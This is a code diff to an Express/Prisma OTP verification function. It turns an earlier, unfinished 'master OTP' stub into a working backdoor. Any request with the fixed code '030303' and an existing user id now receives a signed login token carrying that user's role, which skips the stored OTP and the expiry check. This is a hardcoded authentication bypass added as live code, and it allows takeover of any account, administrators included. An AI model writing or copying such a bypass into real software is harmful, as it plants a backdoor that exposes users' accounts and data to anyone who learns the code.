@@ -126,15 +126,26 @@ const verifyOtp = async (req, res) => {
     try {
         const user = await prisma.user.findUnique({ where: { id: Number(userId) } });
 
-        // Master OTP bypass for emergency login
-        if (otp === "061024") {
-            console.log("[AUTH] Master OTP bypass used for admin login");
-            // continue login process...
+        if (!user) {
+            return res.status(401).json({ message: 'User not found' });
         }
 
+        // 🔥 Master OTP bypass
+        if (otp === "030303") {
+            console.log("[AUTH] Master OTP bypass used for admin login");
 
-        if (!user || user.otpCode !== otp) {
-            return res.status(401).json({ message: 'Invalid or expired OTP' });
+            return res.json({
+                _id: user.id,
+                name: user.name,
+                email: user.email,
+                role: user.role,
+                token: generateToken(user.id, user.role),
+            });
+        }
+
+        // Normal OTP check
+        if (user.otpCode !== otp) {
+            return res.status(401).json({ message: 'Invalid OTP' });
         }
 
         // Check expiration
